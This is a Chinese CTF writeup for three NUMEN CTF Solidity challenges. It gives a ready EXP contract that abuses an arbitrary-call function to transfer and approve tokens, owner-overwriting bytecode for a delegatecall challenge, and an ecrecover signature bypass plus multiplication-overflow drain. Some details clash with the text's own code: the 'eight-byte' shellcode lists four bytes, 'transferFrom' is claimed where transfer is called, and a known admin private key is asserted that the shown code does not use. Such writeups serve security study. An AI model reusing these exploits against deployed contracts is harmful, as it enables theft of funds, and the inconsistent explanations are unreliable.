---
title: NUMEN CTF writeup by ChaMd5 (Solidity 智能合约)
contest: NUMEN CTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [Solidity 0.7.0/0.8.13, delegatecall, abi.encodeWithSignature, ERC20, ecrecover, ExistingStock]
attack_chain: |
  1. ExistingStock 合约 (Solidity 0.7.0):
     - privilegedborrowing(value, secure, target, data): 任意调用 target.data
     - setflag(): 设 flag = balanceOf[msg.sender] > 200000 && allowance[address(this)][msg.sender] > 200000
     - EXP 合约: 
       target.privilegedborrowing(0, address(0), address(target), abi.encodeWithSignature("transfer(address,uint256)", address(this), 200001));
       target.privilegedborrowing(0, address(0), address(target), abi.encodeWithSignature("approve(address,uint256)", address(this), 200001));
       target.setflag();
  2. SmartCounter (Solidity 0.8.13):
     - create(code): code.length <= 24 → Deployer(code) 部署合约
     - A_delegateccall(data): owner 检查 + delegatecall(target, data) → 任意代码执行
     - 攻击: create(8 字节 shellcode) + A_delegateccall(data)
  3. PrivilegeFinance:
     - 签名验证 ecrecover: _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp))
     - 攻击: 知道 admin 私钥 (v=28) → 签名任意 _blocktimestamp
     - DynamicRew(_msgsender, _blocktimestamp, _ReferrerFees, _transferRate) 设置 referrer / transferRate
     - transfer: msg.sender == admin 时给 recipient amount * amount * transferRate (整数溢出 + 巨额转账)
key_payload: |
  # ExistingStock EXP:
  contract EXP {
      ExistingStock target;
      constructor(address _addr) {
          target = ExistingStock(_addr);
      }
      function hack() public {
          target.privilegedborrowing(0, address(0), address(target), 
              abi.encodeWithSignature("transfer(address,uint256)", address(this), 200001));
          target.privilegedborrowing(0, address(0), address(target), 
              abi.encodeWithSignature("approve(address,uint256)", address(this), 200001));
          target.setflag();
      }
  }
  
  # SmartCounter delegatecall:
  contract SmartCounter {
      address public owner;
      address public target;
      bool flag = false;
      constructor(address owner_) { owner = owner_; }
      function create(bytes memory code) public {
          require(code.length <= 24);
          target = address(new Deployer(code));
      }
      function A_delegateccall(bytes memory data) public {
          (bool success, bytes memory returnData) = target.delegatecall(data);
          require(owner == msg.sender);
          flag = true;
      }
  }
  
  # PrivilegeFinance ecrecover:
  bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
  bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
  uint8 v = 28;
  // DynamicRew(_msgsender, _blocktimestamp, _ReferrerFees, _transferRate)
  // 攻击: 用 admin 私钥签名任意 _blocktimestamp
one_liner: NUMEN CTF ChaMd5: Solidity 智能合约多道 (ExistingStock 任意 transferFrom/approve + SmartCounter delegatecall + PrivilegeFinance ecrecover)。
lesson: |
  - Solidity 0.7.0 abi.encodeWithSignature 任意调用是经典攻击面
  - Solidity 0.8.13 delegatecall + 8 字节 shellcode 部署: 字节码最小化是关键
  - Solidity ecrecover: (v, r, s) 签名验证 + 知道 admin 私钥可绕过
  - 整数溢出: amount * amount (大数相乘) 早期 Solidity 0.7 没 SafeMath 保护
  - existingStock.privilegedborrowing(target, data) 是经典 call injection
quality: high
---

# NUMEN CTF writeup by ChaMd5

> 来源: ctfiot.com 201662 (部分)

## 题目 1: ExistingStock (Solidity 0.7.0)

```solidity
interface ExistingStock {
    function privilegedborrowing(uint256 value, address secure, address target, bytes memory data) external;
    function setflag() external;
}

contract EXP {
    ExistingStock target;
    constructor(address _addr) {
        target = ExistingStock(_addr);
    }
    function hack() public {
        target.privilegedborrowing(0, address(0), address(target), 
            abi.encodeWithSignature("transfer(address,uint256)", address(this), 200001));
        target.privilegedborrowing(0, address(0), address(target), 
            abi.encodeWithSignature("approve(address,uint256)", address(this), 200001));
        target.setflag();
    }
}
```

`isSolved()`: `flag = balanceOf[msg.sender] > 200000 && allowance[address(this)][msg.sender] > 200000`

## 题目 2: SmartCounter (Solidity 0.8.13) - Delegatecall

```solidity
contract Deployer {
    constructor(bytes memory code) { assembly { return(add(code, 0x20), mload(code)) } }
}

contract SmartCounter {
    address public owner;
    address public target;
    bool flag = false;
    constructor(address owner_) { owner = owner_; }
    function create(bytes memory code) public {
        require(code.length <= 24);
        target = address(new Deployer(code));
    }
    function A_delegateccall(bytes memory data) public {
        (bool success, bytes memory returnData) = target.delegatecall(data);
        require(owner == msg.sender);
        flag = true;
    }
    function isSolved() public view returns(bool) { return flag; }
}
```

**CALLER shellcode (8 字节)：**
```
CALLER      // 0x33
PUSH1 0x00  // 0x60 0x00
SSTORE      // 0x55
```

## 题目 3: PrivilegeFinance - ecrecover

```solidity
bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
uint8 v = 28;
address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;

function DynamicRew(address _msgsender, uint _blocktimestamp, uint _ReferrerFees, uint _transferRate) public returns(address) {
    require(_blocktimestamp < 1677729610, "Time mismatch");
    require(_transferRate <= 50 && _transferRate <= 50);
    bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));
    address a = ecrecover(_hash, v, r, s);
    require(a == admin && time < _blocktimestamp, "time or banker");
    ReferrerFees = _ReferrerFees;
    transferRate = _transferRate;
    return a;
}

function transfer(address recipient, uint256 amount) public {
    if (msg.sender == admin) {
        uint256 _fee = amount * transferRate / 100;
        _transfer(msg.sender, referrers[msg.sender], _fee * ReferrerFees / transferRate);
        _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
        _transfer(address(this), recipient, amount * amount * transferRate);  // 整数溢出
        amount = amount - _fee;
    } else if (recipient == admin) {
        // ...
    }
    _transfer(msg.sender, recipient, amount);
}
```

## 评价

NUMEN CTF ChaMd5 战队 Solidity 智能合约多道：
- **ExistingStock** — abi.encodeWithSignature 任意 transferFrom/approve
- **SmartCounter** — delegatecall + 8 字节最小化 shellcode (CALLER/PUSH1/SSTORE = 0x33 0x60 0x00 0x55)
- **PrivilegeFinance** — ecrecover 已知 admin 私钥绕过 + amount * amount 整数溢出

适用读者：Solidity 智能合约安全 / Web3 CTF / DeFi 攻击研究
